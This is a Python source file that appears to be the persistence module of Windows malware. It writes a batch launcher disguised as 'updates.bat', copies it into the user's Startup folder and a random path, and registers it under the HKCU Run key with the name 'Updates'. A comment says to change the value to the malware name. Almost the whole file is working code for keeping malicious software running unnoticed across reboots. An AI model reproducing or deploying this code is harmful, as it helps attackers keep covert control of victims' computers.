import os
from random import random
import shutil
import winreg
import os
from features.func import generate_random_path

current_user = os.getenv("USERNAME")
cwd = os.getcwd() + "/updates.bat"
startup_path = f"C:/Users/{current_user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
file_path = f"{startup_path}/updates.bat"

def persist():
    if not __sanity():
        __create_lunch_script()
        __create_registry_key()
        __copy_to_startup()


def __create_lunch_script():
    python_path = f"C:/Users/{current_user}/AppData/Local/Programs/Python/Python39/python.exe"
    main_path = f"{os.getcwd()}/main.py"

    content = f"@echo off \n{python_path} {main_path} \npause"
    with open("updates.bat", "w+") as f:
        f.write(content)


def __sanity():
    return os.path.exists(file_path)


def __copy_to_startup():
    try:
        shutil.copyfile(cwd, file_path)
    except shutil.SameFileError: # in case file already exists
        pass


def __create_registry_key():
    trigger_path = generate_random_path()
    shutil.copy(cwd, trigger_path + "updates.bat")

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS) as key:
            winreg.SetValueEx(key, 'Updates', 0, winreg.REG_SZ,
                              trigger_path + "updates.bat")  # <- Should be changed to the malware name
    except OSError:
        pass


